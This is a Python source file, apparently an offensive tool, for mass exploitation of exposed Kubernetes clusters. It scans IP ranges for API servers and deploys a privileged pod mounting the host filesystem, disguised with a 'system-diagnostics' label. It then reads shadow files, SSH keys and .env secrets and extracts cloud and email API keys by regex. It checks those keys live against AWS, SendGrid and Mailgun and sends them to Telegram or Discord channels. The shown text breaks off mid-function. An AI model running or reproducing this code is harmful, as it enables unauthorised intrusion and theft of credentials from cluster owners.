#!/usr/bin/env python3
"""
ğŸš€ WWYV4Q - Kubernetes Advanced Exploitation Master
Author: wKayaa
Date: 2025-06-23 22:28:51 UTC

Module autonome pour exploitation de clusters Kubernetes avec:
- Scan de pods vulnÃ©rables
- DÃ©ploiement de pods privilÃ©giÃ©s
- Extraction de credentials d'APIs cloud
- Validation en temps rÃ©el
- Notifications Telegram/Discord
"""

import asyncio
import aiohttp
import json
import base64
import re
import os
import subprocess
import tempfile
import yaml
import hashlib
import uuid
from datetime import datetime
from typing import Dict, List, Optional, Tuple, Any
from dataclasses import dataclass, field
import boto3
from botocore.exceptions import ClientError, NoCredentialsError
import requests
import hmac
import hashlib
import time
from pathlib import Path

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸ¯ CONFIGURATION ET TYPES
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

@dataclass
class CredentialMatch:
    """Structure pour stocker les credentials trouvÃ©s"""
    type: str
    value: str
    file_path: str
    cluster_endpoint: str
    confidence: float
    validated: bool = False
    validation_result: Dict = field(default_factory=dict)
    extraction_time: str = field(default_factory=lambda: datetime.utcnow().isoformat())

@dataclass
class ExploitationResult:
    """RÃ©sultats d'exploitation d'un cluster"""
    cluster_endpoint: str
    status: str
    vulnerable_pods: List[Dict] = field(default_factory=list)
    escalation_pods: List[str] = field(default_factory=list)
    credentials_found: List[CredentialMatch] = field(default_factory=list)
    files_explored: List[str] = field(default_factory=list)
    errors: List[str] = field(default_factory=list)

class K8sExploitMaster:
    """Classe principale d'exploitation Kubernetes"""
    
    def __init__(self, telegram_token: str = None, telegram_chat_id: str = None,
                 discord_webhook: str = None):
        self.session_id = str(uuid.uuid4())[:8]
        self.start_time = datetime.utcnow()
        
        # Configuration Telegram/Discord
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.discord_webhook = discord_webhook
        
        # Patterns de dÃ©tection de credentials
        self.credential_patterns = {
            'aws_access_key': r'AKIA[0-9A-Z]{16}',
            'aws_secret_key': r'[A-Za-z0-9/+=]{40}',
            'sendgrid_api_key': r'SG\.[a-zA-Z0-9_-]{22,}\.[a-zA-Z0-9_-]{43,}',
            'mailgun_api_key': r'key-[0-9a-zA-Z]{32}',
            'mailjet_api_key': r'[a-f0-9]{32}',
            'twilio_api_key': r'SK[0-9a-f]{32}',
            'brevo_api_key': r'xkeysib-[a-z0-9]{64}',
            'jwt_token': r'eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*',
            'generic_api_key': r'["\']?[a-zA-Z0-9_-]{20,}["\']?',
            'password': r'["\']?[a-zA-Z0-9@#$%^&*!]{8,}["\']?'
        }
        
        # Chemins Ã  explorer
        self.target_paths = [
            '/host/etc/kubernetes/admin.conf',
            '/var/run/secrets/kubernetes.io/serviceaccount/token',
            '/etc/secrets/',
            '/etc/passwd',
            '/etc/shadow',
            '/root/.aws/credentials',
            '/root/.ssh/id_rsa',
            '/home/*/.ssh/id_rsa',
            '/opt/app/.env',
            '/app/.env',
            '/config.yml',
            '/credentials',
            '/secrets.json',
            '/etc/environment'
        ]
        
        # Extensions de fichiers sensibles
        self.sensitive_extensions = ['.env', '.json', '.yml', '.yaml', '.conf', '.config', '.key', '.pem']
        
        # Statistiques
        self.stats = {
            'clusters_scanned': 0,
            'clusters_exploited': 0,
            'pods_deployed': 0,
            'credentials_found': 0,
            'credentials_validated': 0,
            'files_explored': 0
        }
        
        print(f"ğŸš€ K8s Exploit Master initialisÃ© - Session: {self.session_id}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸ” DÃ‰TECTION ET SCAN
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def scan_vulnerable_pods(self, session: aiohttp.ClientSession, 
                                 cluster_endpoint: str) -> List[Dict]:
        """Scan des pods vulnÃ©rables dans le cluster"""
        vulnerable_pods = []
        
        try:
            # RÃ©cupÃ©ration de la liste des pods
            pods_url = f"{cluster_endpoint}/api/v1/pods"
            
            async with session.get(pods_url, ssl=False, timeout=10) as response:
                if response.status == 200:
                    pods_data = await response.json()
                    
                    for pod in pods_data.get('items', []):
                        vulnerabilities = self._analyze_pod_security(pod)
                        
                        if vulnerabilities:
                            vulnerable_pods.append({
                                'name': pod['metadata']['name'],
                                'namespace': pod['metadata']['namespace'],
                                'vulnerabilities': vulnerabilities,
                                'spec': pod.get('spec', {})
                            })
                            
                            print(f"ğŸš¨ Pod vulnÃ©rable trouvÃ©: {pod['metadata']['name']} "
                                  f"({', '.join(vulnerabilities)})")
                    
        except Exception as e:
            print(f"âŒ Erreur scan pods: {str(e)}")
            
        return vulnerable_pods

    def _analyze_pod_security(self, pod: Dict) -> List[str]:
        """Analyse de sÃ©curitÃ© d'un pod"""
        vulnerabilities = []
        spec = pod.get('spec', {})
        
        # VÃ©rification hostNetwork
        if spec.get('hostNetwork'):
            vulnerabilities.append('hostNetwork')
            
        # VÃ©rification hostPID
        if spec.get('hostPID'):
            vulnerabilities.append('hostPID')
            
        # VÃ©rification serviceAccount
        if spec.get('serviceAccountName') != 'default':
            vulnerabilities.append('custom_serviceAccount')
            
        # VÃ©rification des conteneurs
        for container in spec.get('containers', []):
            security_context = container.get('securityContext', {})
            
            if security_context.get('privileged'):
                vulnerabilities.append('privileged')
                
            if security_context.get('allowPrivilegeEscalation', True):
                vulnerabilities.append('privilegeEscalation')
                
            if not security_context.get('runAsNonRoot'):
                vulnerabilities.append('runAsRoot')
                
        return vulnerabilities

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸš€ DÃ‰PLOIEMENT DE PODS PRIVILÃ‰GIÃ‰S
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def deploy_escalation_pod(self, session: aiohttp.ClientSession,
                                  cluster_endpoint: str, namespace: str = 'default') -> Optional[str]:
        """DÃ©ploie un pod d'escalade de privilÃ¨ges"""
        
        pod_name = f"escaleroot-{self.session_id}"
        
        # DÃ©finition du pod privilÃ©giÃ©
        escalation_pod = {
            "apiVersion": "v1",
            "kind": "Pod",
            "metadata": {
                "name": pod_name,
                "namespace": namespace,
                "labels": {
                    "app": "system-diagnostics",
                    "component": "debug-utils"
                }
            },
            "spec": {
                "hostNetwork": True,
                "hostPID": True,
                "hostIPC": True,
                "serviceAccountName": "default",
                "containers": [{
                    "name": "escalation-container",
                    "image": "alpine:latest",
                    "command": ["/bin/sh"],
                    "args": ["-c", "sleep 3600"],
                    "securityContext": {
                        "privileged": True,
                        "allowPrivilegeEscalation": True,
                        "runAsUser": 0,
                        "capabilities": {
                            "add": ["ALL"]
                        }
                    },
                    "volumeMounts": [
                        {
                            "name": "host-root",
                            "mountPath": "/host",
                            "readOnly": False
                        },
                        {
                            "name": "host-proc",
                            "mountPath": "/host/proc",
                            "readOnly": False
                        },
                        {
                            "name": "host-sys",
                            "mountPath": "/host/sys",
                            "readOnly": False
                        }
                    ]
                }],
                "volumes": [
                    {
                        "name": "host-root",
                        "hostPath": {
                            "path": "/",
                            "type": "Directory"
                        }
                    },
                    {
                        "name": "host-proc",
                        "hostPath": {
                            "path": "/proc",
                            "type": "Directory"
                        }
                    },
                    {
                        "name": "host-sys",
                        "hostPath": {
                            "path": "/sys",
                            "type": "Directory"
                        }
                    }
                ],
                "restartPolicy": "Never",
                "tolerations": [
                    {
                        "operator": "Exists"
                    }
                ]
            }
        }
        
        try:
            # DÃ©ploiement du pod
            deploy_url = f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods"
            
            async with session.post(deploy_url, 
                                  json=escalation_pod,
                                  ssl=False,
                                  timeout=15) as response:
                
                if response.status in [200, 201]:
                    self.stats['pods_deployed'] += 1
                    print(f"âœ… Pod privilÃ©giÃ© dÃ©ployÃ©: {pod_name}")
                    
                    # Attendre que le pod soit prÃªt
                    await self._wait_for_pod_ready(session, cluster_endpoint, 
                                                 namespace, pod_name)
                    
                    return pod_name
                else:
                    error_text = await response.text()
                    print(f"âŒ Ã‰chec dÃ©ploiement pod: {response.status} - {error_text}")
                    
        except Exception as e:
            print(f"âŒ Erreur dÃ©ploiement pod: {str(e)}")
            
        return None

    async def _wait_for_pod_ready(self, session: aiohttp.ClientSession,
                                cluster_endpoint: str, namespace: str, pod_name: str):
        """Attend que le pod soit prÃªt"""
        for _ in range(30):  # 30 tentatives max
            try:
                pod_url = f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods/{pod_name}"
                
                async with session.get(pod_url, ssl=False, timeout=5) as response:
                    if response.status == 200:
                        pod_data = await response.json()
                        status = pod_data.get('status', {})
                        
                        if status.get('phase') == 'Running':
                            print(f"âœ… Pod {pod_name} prÃªt")
                            return True
                            
            except Exception:
                pass
                
            await asyncio.sleep(2)
            
        print(f"âš ï¸ Timeout attente pod {pod_name}")
        return False

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸ” EXPLORATION DE FICHIERS ET EXTRACTION
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def explore_pod_filesystem(self, session: aiohttp.ClientSession,
                                   cluster_endpoint: str, namespace: str, 
                                   pod_name: str) -> List[CredentialMatch]:
        """Explore le systÃ¨me de fichiers du pod pour extraire des credentials"""
        credentials_found = []
        
        for target_path in self.target_paths:
            try:
                # Commande pour explorer le chemin
                command = f"find {target_path} -type f 2>/dev/null | head -100"
                
                output = await self._execute_command_in_pod(
                    session, cluster_endpoint, namespace, pod_name, command
                )
                
                if output:
                    files = output.strip().split('\n')
                    for file_path in files:
                        if file_path and self._is_sensitive_file(file_path):
                            # Lire le contenu du fichier
                            content = await self._read_file_in_pod(
                                session, cluster_endpoint, namespace, 
                                pod_name, file_path
                            )
                            
                            if content:
                                # Extraire les credentials
                                file_credentials = self._extract_credentials_from_content(
                                    content, file_path, cluster_endpoint
                                )
                                credentials_found.extend(file_credentials)
                                self.stats['files_explored'] += 1
                                
            except Exception as e:
                print(f"âŒ Erreur exploration {target_path}: {str(e)}")
                
        # Recherche de fichiers .env, .json, etc.
        await self._search_sensitive_files(session, cluster_endpoint, 
                                          namespace, pod_name, credentials_found)
        
        return credentials_found

    async def _execute_command_in_pod(self, session: aiohttp.ClientSession,
                                    cluster_endpoint: str, namespace: str,
                                    pod_name: str, command: str) -> Optional[str]:
        """ExÃ©cute une commande dans le pod"""
        try:
            # URL pour l'exÃ©cution de commandes
            exec_url = (f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods/"
                       f"{pod_name}/exec?command=sh&command=-c&command={command}"
                       f"&stdout=true&stderr=true")
            
            async with session.get(exec_url, ssl=False, timeout=10) as response:
                if response.status == 200:
                    return await response.text()
                    
        except Exception as e:
            print(f"âŒ Erreur exÃ©cution commande: {str(e)}")
            
        return None

    async def _read_file_in_pod(self, session: aiohttp.ClientSession,
                              cluster_endpoint: str, namespace: str,
                              pod_name: str, file_path: str) -> Optional[str]:
        """Lit le contenu d'un fichier dans le pod"""
        try:
            command = f"cat '{file_path}' 2>/dev/null"
            return await self._execute_command_in_pod(
                session, cluster_endpoint, namespace, pod_name, command
            )
        except Exception:
            return None

    def _is_sensitive_file(self, file_path: str) -> bool:
        """VÃ©rifie si un fichier est potentiellement sensible"""
        file_path_lower = file_path.lower()
        
        # Extensions sensibles
        for ext in self.sensitive_extensions:
            if file_path_lower.endswith(ext):
                return True
                
        # Noms de fichiers sensibles
        sensitive_names = ['credential', 'secret', 'password', 'token', 'key', 'config']
        for name in sensitive_names:
            if name in file_path_lower:
                return True
                
        return False

    async def _search_sensitive_files(self, session: aiohttp.ClientSession,
                                    cluster_endpoint: str, namespace: str,
                                    pod_name: str, credentials_found: List):
        """Recherche rÃ©cursive de fichiers sensibles"""
        
        search_commands = [
            "find /host -name '*.env' 2>/dev/null | head -50",
            "find /host -name '*.json' 2>/dev/null | head -50",
            "find /host -name '*config*' 2>/dev/null | head -50",
            "find /host -name '*credential*' 2>/dev/null | head -50",
            "find /host -name '*secret*' 2>/dev/null | head -50",
            "find /etc -name '*.conf' 2>/dev/null | head -30"
        ]
        
        for command in search_commands:
            try:
                output = await self._execute_command_in_pod(
                    session, cluster_endpoint, namespace, pod_name, command
                )
                
                if output:
                    files = output.strip().split('\n')
                    for file_path in files[:10]:  # Limite Ã  10 fichiers par recherche
                        if file_path.strip():
                            content = await self._read_file_in_pod(
                                session, cluster_endpoint, namespace, 
                                pod_name, file_path.strip()
                            )
                            
                            if content:
                                file_credentials = self._extract_credentials_from_content(
                                    content, file_path, cluster_endpoint
                                )
                                credentials_found.extend(file_credentials)
                                
            except Exception as e:
                print(f"âŒ Erreur recherche fichiers: {str(e)}")

    def _extract_credentials_from_content(self, content: str, file_path: str,
                                        cluster_endpoint: str) -> List[CredentialMatch]:
        """Extrait les credentials du contenu d'un fichier"""
        credentials = []
        
        for cred_type, pattern in self.credential_patterns.items():
            matches = re.findall(pattern, content, re.IGNORECASE | re.MULTILINE)
            
            for match in matches:
                if self._is_valid_credential(match, cred_type):
                    credential = CredentialMatch(
                        type=cred_type,
                        value=match,
                        file_path=file_path,
                        cluster_endpoint=cluster_endpoint,
                        confidence=self._calculate_confidence(match, cred_type, content)
                    )
                    credentials.append(credential)
                    self.stats['credentials_found'] += 1
                    
                    print(f"ğŸ”‘ Credential trouvÃ©: {cred_type} dans {file_path}")
                    
        return credentials

    def _is_valid_credential(self, value: str, cred_type: str) -> bool:
        """Valide si une valeur ressemble Ã  un vrai credential"""
        
        # Filtrer les valeurs trop courtes ou Ã©videntes
        if len(value) < 8:
            return False
            
        # Patterns invalides
        invalid_patterns = [
            'example', 'test', 'demo', 'placeholder', 'your_key_here',
            'xxxxx', '12345', 'password', 'secret'
        ]
        
        value_lower = value.lower()
        for invalid in invalid_patterns:
            if invalid in value_lower:
                return False
                
        return True

    def _calculate_confidence(self, value: str, cred_type: str, context: str) -> float:
        """Calcule le niveau de confiance d'un credential"""
        confidence = 0.5
        
        # Augmenter si format exact
        if cred_type == 'aws_access_key' and value.startswith('AKIA'):
            confidence += 0.3
        elif cred_type == 'sendgrid_api_key' and value.startswith('SG.'):
            confidence += 0.3
        elif cred_type == 'mailgun_api_key' and value.startswith('key-'):
            confidence += 0.3
            
        # Augmenter si dans un contexte appropriÃ©
        context_keywords = ['aws', 'sendgrid', 'mailgun', 'api', 'secret', 'key']
        for keyword in context_keywords:
            if keyword.lower() in context.lower():
                confidence += 0.1
                
        return min(confidence, 1.0)

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# âœ… VALIDATION DE CREDENTIALS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def validate_credentials(self, credentials: List[CredentialMatch]):
        """Valide les credentials en temps rÃ©el"""
        
        for credential in credentials:
            try:
                if credential.type == 'aws_access_key':
                    await self._validate_aws_credentials(credential, credentials)
                elif credential.type == 'sendgrid_api_key':
                    await self._validate_sendgrid_credentials(credential)
                elif credential.type == 'mailgun_api_key':
                    await self._validate_mailgun_credentials(credential)
                    
                if credential.validated:
                    self.stats['credentials_validated'] += 1
                    await self._send_credential_alert(credential)
                    
            except Exception as e:
                print(f"âŒ Erreur validation {credential.type}: {str(e)}")

    async def _validate_aws_credentials(self, access_key_cred: CredentialMatch,
                                      all_credentials: List[CredentialMatch]):
        """Valide les credentials AWS SES/SNS"""
        
        # Trouver la clÃ© secrÃ¨te correspondante
        secret_key = None
        for cred in all_credentials:
            if (cred.type == 'aws_secret_key' and 
                cred.file_path == access_key_cred.file_path):
                secret_key = cred.value
                break
                
        if not secret_key:
            return
            
        try:
            # Test SES
            ses_client = boto3.client(
                'ses',
                aws_access_key_id=access_key_cred.value,
                aws_secret_access_key=secret_key,
                region_name='us-east-1'
            )
            
            response = ses_client.get_send_quota()
            
            access_key_cred.validated = True
            access_key_cred.validation_result = {
                'service': 'AWS SES',
                'quota': f"{response['Max24HourSend']}/day",
                'sent': response['SentLast24Hours'],
                'status': 'active'
            }
            
            # Test SNS
            try:
                sns_client = boto3.client(
                    'sns',
                    aws_access_key_id=access_key_cred.value,
                    aws_secret_access_key=secret_key,
                    region_name='us-east-1'
                )
                
                topics_response = sns_client.list_topics()
                access_key_cred.validation_result['sns_topics'] = [
                    topic['TopicArn'] for topic in topics_response.get('Topics', [])
                ]
                
            except Exception:
                pass
                
            print(f"âœ… AWS credentials validÃ©s: {access_key_cred.value}")
            
        except Exception as e:
            print(f"âŒ AWS validation failed: {str(e)}")

    async def _validate_sendgrid_credentials(self, credential: CredentialMatch):
        """Valide les credentials SendGrid"""
        
        try:
            headers = {
                'Authorization': f'Bearer {credential.value}',
                'Content-Type': 'application/json'
            }
            
            # Test API credits
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.sendgrid.com/v3/user/credits',
                                     headers=headers, timeout=10) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        
                        credential.validated = True
                        credential.validation_result = {
                            'service': 'SendGrid',
                            'quota': 'active',
                            'credits': data.get('total', 'unknown')
                        }
                        
                        # Test senders
                        async with session.get('https://api.sendgrid.com/v3/senders',
                                             headers=headers, timeout=10) as senders_response:
                            if senders_response.status == 200:
                                senders_data = await senders_response.json()
                                credential.validation_result['senders'] = [
                                    sender.get('from', {}).get('email', '')
                                    for sender in senders_data
                                ]
                        
                        print(f"âœ… SendGrid credentials validÃ©s: {credential.value}")
                        
        except Exception as e:
            print(f"âŒ SendGrid validation failed: {str(e)}")

    async def _validate_mailgun_credentials(self, credential: CredentialMatch):
        """Valide les credentials Mailgun"""
        
        try:
            # Test Mailgun API
            auth = ('api', credential.value)
            
            async with aiohttp.ClientSession() as session:
                async with session.get('https://api.mailgun.net/v3/domains',
                                     auth=aiohttp.BasicAuth('api', credential.value),
                                     timeout=10) as response:
                    
                    if response.status == 200:
                        data = await response.json()
                        
                        credential.validated = True
                        credential.validation_result = {
                            'service': 'Mailgun',
                            'quota': 'active',
                            'domains': [item.get('name', '') for item in data.get('items', [])]
                        }
                        
                        print(f"âœ… Mailgun credentials validÃ©s: {credential.value}")
                        
        except Exception as e:
            print(f"âŒ Mailgun validation failed: {str(e)}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸ“± NOTIFICATIONS
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def _send_credential_alert(self, credential: CredentialMatch):
        """Envoie une alerte pour credential validÃ©"""
        
        message = f"""ğŸš¨ CREDENTIAL VALIDÃ‰ DÃ‰TECTÃ‰!

ğŸ”‘ Type: {credential.type.upper()}
ğŸ’ Valeur: {credential.value[:20]}...
ğŸ“ Fichier: {credential.file_path}
ğŸ¯ Cluster: {credential.cluster_endpoint}
âœ… Validation: {credential.validation_result.get('service', 'Unknown')}
ğŸ“Š Quota: {credential.validation_result.get('quota', 'Unknown')}
â° Extraction: {credential.extraction_time}

Session: {self.session_id}"""

        # Telegram
        if self.telegram_token and self.telegram_chat_id:
            await self._send_telegram_message(message)
            
        # Discord
        if self.discord_webhook:
            await self._send_discord_message(message)

    async def _send_telegram_message(self, message: str):
        """Envoie un message Telegram"""
        try:
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            
            async with aiohttp.ClientSession() as session:
                async with session.post(url, json={
                    'chat_id': self.telegram_chat_id,
                    'text': message,
                    'parse_mode': 'HTML'
                }, timeout=10) as response:
                    
                    if response.status == 200:
                        print("âœ… Message Telegram envoyÃ©")
                    else:
                        print(f"âŒ Erreur Telegram: {response.status}")
                        
        except Exception as e:
            print(f"âŒ Erreur Telegram: {str(e)}")

    async def _send_discord_message(self, message: str):
        """Envoie un message Discord"""
        try:
            async with aiohttp.ClientSession() as session:
                async with session.post(self.discord_webhook, json={
                    'content': f"```\n{message}\n```"
                }, timeout=10) as response:
                    
                    if response.status in [200, 204]:
                        print("âœ… Message Discord envoyÃ©")
                    else:
                        print(f"âŒ Erreur Discord: {response.status}")
                        
        except Exception as e:
            print(f"âŒ Erreur Discord: {str(e)}")

# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
# ğŸ¯ ORCHESTRATION PRINCIPALE
# â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

    async def exploit_cluster_complete(self, cluster_endpoint: str) -> ExploitationResult:
        """Exploitation complÃ¨te d'un cluster"""
        
        result = ExploitationResult(
            cluster_endpoint=cluster_endpoint,
            status='started'
        )
        
        try:
            async with aiohttp.ClientSession() as session:
                self.stats['clusters_scanned'] += 1
                
                # Phase 1: Scan des pods vulnÃ©rables
                print(f"ğŸ” Phase 1: Scan des pods vulnÃ©rables - {cluster_endpoint}")
                result.vulnerable_pods = await self.scan_vulnerable_pods(session, cluster_endpoint)
                
                # Phase 2: DÃ©ploiement de pod privilÃ©giÃ©
                print(f"ğŸš€ Phase 2: DÃ©ploiement pod d'escalade - {cluster_endpoint}")
                escalation_pod = await self.deploy_escalation_pod(session, cluster_endpoint)
                
                if escalation_pod:
                    result.escalation_pods.append(escalation_pod)
                    
                    # Phase 3: Exploration du systÃ¨me de fichiers
                    print(f"ğŸ” Phase 3: Exploration filesystem - {cluster_endpoint}")
                    result.credentials_found = await self.explore_pod_filesystem(
                        session, cluster_endpoint, 'default', escalation_pod
                    )
                    
                    # Phase 4: Validation des credentials
                    print(f"âœ… Phase 4: Validation credentials - {cluster_endpoint}")
                    await self.validate_credentials(result.credentials_found)
                    
                    # Nettoyage du pod
                    await self._cleanup_pod(session, cluster_endpoint, 'default', escalation_pod)
                    
                    result.status = 'exploited'
                    self.stats['clusters_exploited'] += 1
                    
                else:
                    result.status = 'failed_deployment'
                    result.errors.append("Ã‰chec dÃ©ploiement pod privilÃ©giÃ©")
                    
        except Exception as e:
            result.status = 'error'
            result.errors.append(str(e))
            print(f"âŒ Erreur exploitation cluster: {str(e)}")
            
        return result

    async def _cleanup_pod(self, session: aiohttp.ClientSession,
                         cluster_endpoint: str, namespace: str, pod_name: str):
        """Nettoie le pod dÃ©ployÃ©"""
        try:
            delete_url = f"{cluster_endpoint}/api/v1/namespaces/{namespace}/pods/{pod_name}"
            
            async with session.delete(delete_url, ssl=False, timeout=10) as response:
                if response.status in [200, 202]:
                    print(f"ğŸ§¹ Pod {pod_name} supprimÃ©")
                else:
                    print(f"âš ï¸ Ã‰chec suppression pod: {response.status}")
                    
        except Exception as e:
            print(f"âŒ Erreur nettoyage pod: {str(e)}")

    def format_results_json(self, results: List[ExploitationResult]) -> str:
        """Formate les rÃ©sultats en JSON"""
        
        json_results = {
            "session_id": self.session_id,
            "start_time": self.start_time.isoformat(),
            "end_time": datetime.utcnow().isoformat(),
            "stats": self.stats,
            "clusters": []
        }
        
        for result in results:
            cluster_data = {
                "cluster": result.cluster_endpoint,
                "status": result.status,
                "vulnerable_pods": len(result.vulnerable_pods),
                "credentials": {}
            }
            
            # Organiser les credentials par type
            for cred in result.credentials_found:
                if cred.validated:
                    if cred.type not in cluster_data["credentials"]:
                        cluster_data["credentials"][cred.type] = []
                    
                    cluster_data["credentials"][cred.type].append({
                        "value": cred.value,
                        "validation": cred.validation_result
                    })
            
            # Ajouter des donnÃ©es spÃ©cifiques pour AWS et SendGrid
            aws_creds = [c for c in result.credentials_found if c.type == 'aws_access_key' and c.validated]
            if aws_creds:
                aws_cred = aws_creds[0]
                cluster_data["aws"] = {
                    "access_key": aws_cred.value,
                    "SES_quota": aws_cred.validation_result.get('quota', 'unknown'),
                    "SNS_topics": aws_cred.validation_result.get('sns_topics', [])
                }
            
            sendgrid_creds = [c for c in result.credentials_found if c.type == 'sendgrid_api_key' and c.validated]
            if sendgrid_creds:
                sg_cred = sendgrid_creds[0]
                cluster_data["sendgrid"] = {
                    "api_key": sg_cred.value,
                    "quota": sg_cred.validation_result.get('quota', 'unknown'),
                    "senders": sg_cred.validation_result.get('senders', [])
                }
            
            json_results["clusters"].append(cluster_data)
        
        return json.dumps(json_results, indent=2, ensure_ascii=False)

    async def run_mass_exploitation(self, targets: List[str]) -> List[ExploitationResult]:
        """Lance l'exploitation en masse"""
        
        print(f"ğŸš€ DÃ©marrage exploitation massive - {len(targets)} cibles")
        print(f"ğŸ“± Notifications: Telegram={'âœ…' if self.telegram_token else 'âŒ'} "
              f"Discord={'âœ…' if self.discord_webhook else 'âŒ'}")
        
        # Envoyer message de dÃ©but
        start_message = f"""ğŸš€ K8s Exploit Master - SESSION START
ğŸ“… {datetime.utcnow().isoformat()}
ğŸ¯ Targets: {len(targets)}
ğŸ’ Session: {self.session_id}

Exploitation started! ğŸ”¥"""
        
        if self.telegram_token:
            await self._send_telegram_message(start_message)
        if self.discord_webhook:
            await self._send_discord_message(start_message)
        
        # Expansion des cibles (CIDR -> IPs)
        expanded_targets = []
        for target in targets:
            if '/' in target:  # CIDR
                try:
                    from ipaddress import IPv4Network
                    network = IPv4Network(target, strict=False)
                    hosts = list(network.hosts())[:1000]  # Limite pour Ã©viter explosion mÃ©moire
                    expanded_targets.extend([str(ip) for ip in hosts])
                except Exception:
                    expanded_targets.append(target)
            else:
                expanded_targets.append(target)
        
        print(f"ğŸ¯ {len(expanded_targets)} IPs Ã  scanner")
        
        # Exploitation parallÃ¨le
        results = []
        semaphore = asyncio.Semaphore(10)  # Max 10 clusters en parallÃ¨le
        
        async def exploit_with_semaphore(target):
            async with semaphore:
                # Tester les ports communs K8s
                ports = [6443, 8443, 10250, 8080, 443, 80]
                for port in ports:
                    for protocol in ['https', 'http']:
                        cluster_endpoint = f"{protocol}://{target}:{port}"
                        
                        try:
                            # Test rapide de connectivitÃ©
                            async with aiohttp.ClientSession() as session:
                                async with session.get(cluster_endpoint, 
                                                     ssl=False, timeout=5) as response:
                                    if response.status in [200, 401, 403]:
                                        print(f"ğŸ¯ Cluster dÃ©tectÃ©: {cluster_endpoint}")
                                        result = await self.exploit_cluster_complete(cluster_endpoint)
                                        return result
                        except Exception:
                            continue
                
                return None
        
        # ExÃ©cution des tÃ¢ches
        tasks = [exploit_with_semaphore(target) for target in expanded_targets]
        task_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Filtrer les rÃ©sultats valides
        for task_result in task_results:
            if isinstance(task_result, ExploitationResult):
                results.append(task_result)
        
        # RÃ©sumÃ© final
        exploited_clusters = [r for r in results if r.status == 'exploited']
